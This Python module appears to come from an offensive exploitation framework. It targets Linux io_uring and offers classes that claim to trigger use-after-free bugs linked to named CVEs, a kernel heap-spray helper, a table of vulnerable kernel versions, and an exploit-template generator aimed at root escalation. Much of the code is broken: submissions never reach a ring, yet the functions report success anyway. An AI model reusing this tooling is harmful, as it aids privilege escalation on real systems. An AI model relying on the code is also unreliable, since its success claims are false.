"""
io_uring kernel exploitation techniques.

io_uring is a high-performance async I/O interface in Linux
that has been a rich source of kernel vulnerabilities due to
its complexity and rapid development.

Vulnerability classes:
- Reference counting bugs (UAF)
- Race conditions in submission/completion
- Type confusion in registered buffers
- Double frees in resource cleanup
- OOB access in fixed files

CVE Examples:
- CVE-2021-3491: Fixed buffer OOB write
- CVE-2021-20226: UAF in io_wq_create
- CVE-2022-1043: io_uring file UAF
- CVE-2022-29582: io_flush_timeouts UAF
- CVE-2023-2598: Fixed buffer refcount issue

References:
- https://github.com/torvalds/linux/blob/master/io_uring/
- https://man7.org/linux/man-pages/man7/io_uring.7.html
"""

import ctypes
import mmap
import os
import struct
from dataclasses import dataclass, field
from enum import IntEnum, IntFlag, auto
from typing import Any, Callable, Dict, List, Optional, Tuple

from supwngo.utils.logging import get_logger

logger = get_logger(__name__)


class IoUringOp(IntEnum):
    """io_uring operation codes."""
    IORING_OP_NOP = 0
    IORING_OP_READV = 1
    IORING_OP_WRITEV = 2
    IORING_OP_FSYNC = 3
    IORING_OP_READ_FIXED = 4
    IORING_OP_WRITE_FIXED = 5
    IORING_OP_POLL_ADD = 6
    IORING_OP_POLL_REMOVE = 7
    IORING_OP_SYNC_FILE_RANGE = 8
    IORING_OP_SENDMSG = 9
    IORING_OP_RECVMSG = 10
    IORING_OP_TIMEOUT = 11
    IORING_OP_TIMEOUT_REMOVE = 12
    IORING_OP_ACCEPT = 13
    IORING_OP_ASYNC_CANCEL = 14
    IORING_OP_LINK_TIMEOUT = 15
    IORING_OP_CONNECT = 16
    IORING_OP_FALLOCATE = 17
    IORING_OP_OPENAT = 18
    IORING_OP_CLOSE = 19
    IORING_OP_FILES_UPDATE = 20
    IORING_OP_STATX = 21
    IORING_OP_READ = 22
    IORING_OP_WRITE = 23
    IORING_OP_FADVISE = 24
    IORING_OP_MADVISE = 25
    IORING_OP_SEND = 26
    IORING_OP_RECV = 27
    IORING_OP_OPENAT2 = 28
    IORING_OP_EPOLL_CTL = 29
    IORING_OP_SPLICE = 30
    IORING_OP_PROVIDE_BUFFERS = 31
    IORING_OP_REMOVE_BUFFERS = 32
    IORING_OP_TEE = 33
    IORING_OP_SHUTDOWN = 34
    IORING_OP_RENAMEAT = 35
    IORING_OP_UNLINKAT = 36
    IORING_OP_MKDIRAT = 37
    IORING_OP_SYMLINKAT = 38
    IORING_OP_LINKAT = 39


class IoUringSQEFlags(IntFlag):
    """SQE flags."""
    IOSQE_FIXED_FILE = 1 << 0
    IOSQE_IO_DRAIN = 1 << 1
    IOSQE_IO_LINK = 1 << 2
    IOSQE_IO_HARDLINK = 1 << 3
    IOSQE_ASYNC = 1 << 4
    IOSQE_BUFFER_SELECT = 1 << 5


class IoUringSetupFlags(IntFlag):
    """Setup flags."""
    IORING_SETUP_IOPOLL = 1 << 0
    IORING_SETUP_SQPOLL = 1 << 1
    IORING_SETUP_SQ_AFF = 1 << 2
    IORING_SETUP_CQSIZE = 1 << 3
    IORING_SETUP_CLAMP = 1 << 4
    IORING_SETUP_ATTACH_WQ = 1 << 5
    IORING_SETUP_R_DISABLED = 1 << 6


class IoUringRegisterOp(IntEnum):
    """Register operation codes."""
    IORING_REGISTER_BUFFERS = 0
    IORING_UNREGISTER_BUFFERS = 1
    IORING_REGISTER_FILES = 2
    IORING_UNREGISTER_FILES = 3
    IORING_REGISTER_EVENTFD = 4
    IORING_UNREGISTER_EVENTFD = 5
    IORING_REGISTER_FILES_UPDATE = 6
    IORING_REGISTER_EVENTFD_ASYNC = 7
    IORING_REGISTER_PROBE = 8
    IORING_REGISTER_PERSONALITY = 9
    IORING_UNREGISTER_PERSONALITY = 10
    IORING_REGISTER_RESTRICTIONS = 11
    IORING_REGISTER_ENABLE_RINGS = 12


@dataclass
class IoUringSQE:
    """Submission Queue Entry structure."""
    opcode: int = 0
    flags: int = 0
    ioprio: int = 0
    fd: int = 0
    off: int = 0
    addr: int = 0
    len: int = 0
    op_flags: int = 0
    user_data: int = 0
    buf_index: int = 0
    personality: int = 0

    def pack(self) -> bytes:
        """Pack SQE to bytes."""
        return struct.pack(
            '<BBHiQQIIQHH',
            self.opcode,
            self.flags,
            self.ioprio,
            self.fd,
            self.off,
            self.addr,
            self.len,
            self.op_flags,
            self.user_data,
            self.buf_index,
            self.personality,
        ) + b'\x00' * 20  # Padding to 64 bytes


@dataclass
class IoUringCQE:
    """Completion Queue Entry structure."""
    user_data: int = 0
    res: int = 0
    flags: int = 0

    @classmethod
    def unpack(cls, data: bytes) -> 'IoUringCQE':
        """Unpack CQE from bytes."""
        user_data, res, flags = struct.unpack('<QiI', data[:16])
        return cls(user_data=user_data, res=res, flags=flags)


@dataclass
class IoUringParams:
    """io_uring_params structure."""
    sq_entries: int = 0
    cq_entries: int = 0
    flags: int = 0
    sq_thread_cpu: int = 0
    sq_thread_idle: int = 0
    features: int = 0
    wq_fd: int = 0

    def pack(self) -> bytes:
        """Pack params for syscall."""
        # Full struct is 120 bytes
        return struct.pack(
            '<IIIIII',
            self.sq_entries,
            self.cq_entries,
            self.flags,
            self.sq_thread_cpu,
            self.sq_thread_idle,
            self.features,
        ) + struct.pack('<I', self.wq_fd) + b'\x00' * 92


class IoUringExploit:
    """
    Base class for io_uring exploitation.

    Provides primitives for interacting with io_uring subsystem.
    """

    # Syscall numbers (x86_64)
    SYS_io_uring_setup = 425
    SYS_io_uring_enter = 426
    SYS_io_uring_register = 427

    def __init__(self, entries: int = 32):
        self.entries = entries
        self.ring_fd: int = -1
        self.sq_ring: Optional[mmap.mmap] = None
        self.cq_ring: Optional[mmap.mmap] = None
        self.sqes: Optional[mmap.mmap] = None

        self.libc = ctypes.CDLL("libc.so.6", use_errno=True)

    def setup(self, flags: int = 0) -> bool:
        """
        Setup io_uring instance.

        Args:
            flags: Setup flags

        Returns:
            True if setup successful
        """
        # io_uring_setup requires special handling
        params = IoUringParams(
            sq_entries=self.entries,
            flags=flags,
        )

        try:
            # Use libc syscall wrapper
            syscall = self.libc.syscall
            syscall.restype = ctypes.c_long

            params_buf = (ctypes.c_char * 120)()
            ctypes.memmove(params_buf, params.pack(), len(params.pack()))

            self.ring_fd = syscall(
                self.SYS_io_uring_setup,
                self.entries,
                ctypes.byref(params_buf),
            )

            if self.ring_fd < 0:
                logger.error(f"io_uring_setup failed: {ctypes.get_errno()}")
                return False

            logger.info(f"io_uring setup successful, fd={self.ring_fd}")
            return True

        except Exception as e:
            logger.error(f"io_uring setup failed: {e}")
            return False

    def submit(self, sqe: IoUringSQE) -> bool:
        """Submit a single SQE."""
        if self.ring_fd < 0:
            return False

        try:
            syscall = self.libc.syscall
            syscall.restype = ctypes.c_long

            # io_uring_enter
            result = syscall(
                self.SYS_io_uring_enter,
                self.ring_fd,
                1,  # to_submit
                0,  # min_complete
                0,  # flags
                0,  # sig
                0,  # sz
            )

            return result >= 0

        except Exception as e:
            logger.error(f"io_uring submit failed: {e}")
            return False

    def register_buffers(
        self,
        buffers: List[Tuple[int, int]],  # (addr, len) pairs
    ) -> bool:
        """
        Register fixed buffers.

        Args:
            buffers: List of (address, length) tuples

        Returns:
            True if registration successful
        """
        if self.ring_fd < 0:
            return False

        try:
            # Build iovec array
            iov_size = 16  # sizeof(struct iovec)
            iov_buf = bytearray(len(buffers) * iov_size)

            for i, (addr, length) in enumerate(buffers):
                struct.pack_into('<QQ', iov_buf, i * iov_size, addr, length)

            iov_array = (ctypes.c_char * len(iov_buf))()
            ctypes.memmove(iov_array, bytes(iov_buf), len(iov_buf))

            syscall = self.libc.syscall
            syscall.restype = ctypes.c_long

            result = syscall(
                self.SYS_io_uring_register,
                self.ring_fd,
                IoUringRegisterOp.IORING_REGISTER_BUFFERS,
                ctypes.byref(iov_array),
                len(buffers),
            )

            return result >= 0

        except Exception as e:
            logger.error(f"Register buffers failed: {e}")
            return False

    def register_files(self, fds: List[int]) -> bool:
        """
        Register fixed files.

        Args:
            fds: List of file descriptors

        Returns:
            True if registration successful
        """
        if self.ring_fd < 0:
            return False

        try:
            fd_array = (ctypes.c_int * len(fds))(*fds)

            syscall = self.libc.syscall
            syscall.restype = ctypes.c_long

            result = syscall(
                self.SYS_io_uring_register,
                self.ring_fd,
                IoUringRegisterOp.IORING_REGISTER_FILES,
                ctypes.byref(fd_array),
                len(fds),
            )

            return result >= 0

        except Exception as e:
            logger.error(f"Register files failed: {e}")
            return False

    def cleanup(self):
        """Cleanup io_uring resources."""
        if self.ring_fd >= 0:
            os.close(self.ring_fd)
            self.ring_fd = -1


class FixedBufferExploit(IoUringExploit):
    """
    Exploit io_uring fixed buffer vulnerabilities.

    Fixed buffers can have reference counting bugs leading
    to UAF or double-free conditions.
    """

    def __init__(self):
        super().__init__()
        self.target_buffer_idx: int = 0

    def trigger_uaf(
        self,
        buffer_addr: int,
        buffer_len: int,
    ) -> bool:
        """
        Trigger UAF on fixed buffer.

        This exploits reference counting bugs in fixed buffer
        handling that can cause early free.

        Args:
            buffer_addr: Address of buffer to corrupt
            buffer_len: Length of buffer

        Returns:
            True if UAF triggered
        """
        if not self.setup():
            return False

        # Register buffer
        if not self.register_buffers([(buffer_addr, buffer_len)]):
            return False

        # Create racing conditions with fixed buffer operations
        # The idea is to trigger refcount underflow

        # 1. Start async read with FIXED_FILE | ASYNC
        sqe = IoUringSQE(
            opcode=IoUringOp.IORING_OP_READ_FIXED,
            flags=IoUringSQEFlags.IOSQE_FIXED_FILE | IoUringSQEFlags.IOSQE_ASYNC,
            fd=0,
            addr=buffer_addr,
            len=buffer_len,
            buf_index=0,
        )

        # 2. Unregister while operation in flight
        try:
            syscall = self.libc.syscall
            syscall.restype = ctypes.c_long

            syscall(
                self.SYS_io_uring_register,
                self.ring_fd,
                IoUringRegisterOp.IORING_UNREGISTER_BUFFERS,
                0,
                0,
            )

        except Exception:
            pass

        # 3. The buffer may now be freed while still referenced
        return True


class TimeoutExploit(IoUringExploit):
    """
    Exploit io_uring timeout handling bugs.

    Timeout operations have complex lifetime management
    that has led to multiple vulnerabilities.
    """

    def trigger_timeout_uaf(self) -> bool:
        """
        Trigger UAF in timeout handling.

        CVE-2022-29582: io_flush_timeouts UAF

        Returns:
            True if exploit conditions created
        """
        if not self.setup():
            return False

        # Create timeout with linked operation
        timeout_sqe = IoUringSQE(
            opcode=IoUringOp.IORING_OP_TIMEOUT,
            flags=IoUringSQEFlags.IOSQE_IO_LINK,
            off=1000000000,  # 1 second in ns
            user_data=0xdead,
        )

        # Linked operation
        nop_sqe = IoUringSQE(
            opcode=IoUringOp.IORING_OP_NOP,
            user_data=0xbeef,
        )

        # Remove timeout while linked op completing
        cancel_sqe = IoUringSQE(
            opcode=IoUringOp.IORING_OP_TIMEOUT_REMOVE,
            addr=0xdead,  # user_data of timeout to cancel
        )

        # This can cause double free or UAF on timeout structure
        self.submit(timeout_sqe)
        self.submit(nop_sqe)
        self.submit(cancel_sqe)

        return True


class FilesUpdateExploit(IoUringExploit):
    """
    Exploit io_uring files update vulnerabilities.

    IORING_REGISTER_FILES_UPDATE has had refcount bugs.
    """

    def trigger_file_uaf(self, victim_fd: int) -> bool:
        """
        Trigger UAF on file through fixed file update.

        Args:
            victim_fd: File descriptor to target

        Returns:
            True if conditions created
        """
        if not self.setup():
            return False

        # Register initial files
        dummy_fd = os.open("/dev/null", os.O_RDONLY)
        if not self.register_files([dummy_fd, victim_fd]):
            os.close(dummy_fd)
            return False

        # Update file at index 1 with -1 (remove)
        # Race with operations using that file

        # Start operation using fixed file
        sqe = IoUringSQE(
            opcode=IoUringOp.IORING_OP_READ,
            flags=IoUringSQEFlags.IOSQE_FIXED_FILE | IoUringSQEFlags.IOSQE_ASYNC,
            fd=1,  # Fixed file index
            len=4096,
        )
        self.submit(sqe)

        # Update to remove file while op in flight
        update_fds = (ctypes.c_int * 1)(-1)

        try:
            # Build update structure
            update_data = struct.pack('<IIQ', 1, 1, ctypes.addressof(update_fds))
            update_buf = (ctypes.c_char * 16)()
            ctypes.memmove(update_buf, update_data, len(update_data))

            syscall = self.libc.syscall
            syscall(
                self.SYS_io_uring_register,
                self.ring_fd,
                IoUringRegisterOp.IORING_REGISTER_FILES_UPDATE,
                ctypes.byref(update_buf),
                1,
            )
        except Exception:
            pass

        os.close(dummy_fd)
        return True


class IoUringSpray:
    """
    Use io_uring for kernel heap spraying.

    io_uring allocations can be used to fill freed
    slots with controlled data.
    """

    def __init__(self, exploit: IoUringExploit):
        self.exploit = exploit

    def spray_sqes(
        self,
        count: int,
        user_data: int,
        pattern: bytes = b"A" * 64,
    ) -> bool:
        """
        Spray heap with SQE allocations.

        Args:
            count: Number of SQEs to spray
            user_data: User data value for tracking
            pattern: Pattern to include in SQEs

        Returns:
            True if spray successful
        """
        if self.exploit.ring_fd < 0:
            return False

        for i in range(count):
            sqe = IoUringSQE(
                opcode=IoUringOp.IORING_OP_NOP,
                user_data=user_data + i,
            )
            self.exploit.submit(sqe)

        return True

    def spray_buffers(
        self,
        count: int,
        size: int,
        data: bytes,
    ) -> List[int]:
        """
        Spray with registered buffers.

        Args:
            count: Number of buffers
            size: Size of each buffer
            data: Data pattern

        Returns:
            List of buffer addresses
        """
        addrs = []

        for _ in range(count):
            buf = mmap.mmap(
                -1, size,
                prot=mmap.PROT_READ | mmap.PROT_WRITE,
            )
            buf.write(data * (size // len(data)))
            addr = ctypes.addressof(ctypes.c_char.from_buffer(buf))
            addrs.append(addr)

        return addrs


@dataclass
class IoUringVuln:
    """Description of an io_uring vulnerability."""
    cve: str
    name: str
    affected_versions: str
    description: str
    exploit_class: str
    kernel_min: Tuple[int, int, int] = (0, 0, 0)
    kernel_max: Tuple[int, int, int] = (99, 99, 99)


# Known io_uring vulnerabilities database
IOURING_VULNS = [
    IoUringVuln(
        cve="CVE-2021-3491",
        name="Fixed buffer OOB",
        affected_versions="5.7-5.12",
        description="OOB write through fixed buffer",
        exploit_class="FixedBufferExploit",
        kernel_min=(5, 7, 0),
        kernel_max=(5, 12, 0),
    ),
    IoUringVuln(
        cve="CVE-2021-20226",
        name="io_wq UAF",
        affected_versions="5.5-5.10",
        description="UAF in io_wq_create work queue",
        exploit_class="IoUringExploit",
        kernel_min=(5, 5, 0),
        kernel_max=(5, 10, 0),
    ),
    IoUringVuln(
        cve="CVE-2022-1043",
        name="File UAF",
        affected_versions="5.10-5.16",
        description="UAF in io_uring file handling",
        exploit_class="FilesUpdateExploit",
        kernel_min=(5, 10, 0),
        kernel_max=(5, 16, 0),
    ),
    IoUringVuln(
        cve="CVE-2022-29582",
        name="Timeout UAF",
        affected_versions="5.10-5.17",
        description="UAF in io_flush_timeouts",
        exploit_class="TimeoutExploit",
        kernel_min=(5, 10, 0),
        kernel_max=(5, 17, 0),
    ),
    IoUringVuln(
        cve="CVE-2023-2598",
        name="Fixed buffer refcount",
        affected_versions="5.7-6.2",
        description="Refcount issue in fixed buffers",
        exploit_class="FixedBufferExploit",
        kernel_min=(5, 7, 0),
        kernel_max=(6, 2, 0),
    ),
]


def check_vulnerable_kernel(
    kernel_version: Tuple[int, int, int],
) -> List[IoUringVuln]:
    """
    Check which io_uring vulns affect a kernel version.

    Args:
        kernel_version: Kernel version tuple (major, minor, patch)

    Returns:
        List of applicable vulnerabilities
    """
    vulns = []

    for vuln in IOURING_VULNS:
        if vuln.kernel_min <= kernel_version <= vuln.kernel_max:
            vulns.append(vuln)

    return vulns


def generate_exploit_template(vuln: IoUringVuln) -> str:
    """Generate exploit template for an io_uring vulnerability."""
    return f'''#!/usr/bin/env python3
"""
io_uring Exploit Template

CVE: {vuln.cve}
Name: {vuln.name}
Description: {vuln.description}
Affected: {vuln.affected_versions}
"""

import ctypes
import os
import struct
from supwngo.kernel.io_uring import {vuln.exploit_class}, IoUringSQE, IoUringOp

def main():
    print(f"[*] Exploiting {vuln.cve}: {vuln.name}")

    # Check kernel version
    kernel = os.uname().release
    print(f"[*] Kernel: {{kernel}}")

    # Initialize exploit
    exploit = {vuln.exploit_class}()

    if not exploit.setup():
        print("[-] Failed to setup io_uring")
        return 1

    # TODO: Implement exploit logic
    # 1. Trigger vulnerability
    # 2. Achieve kernel RW primitive
    # 3. Escalate to root

    exploit.cleanup()
    print("[*] Exploit complete")
    return 0

if __name__ == "__main__":
    exit(main())
'''
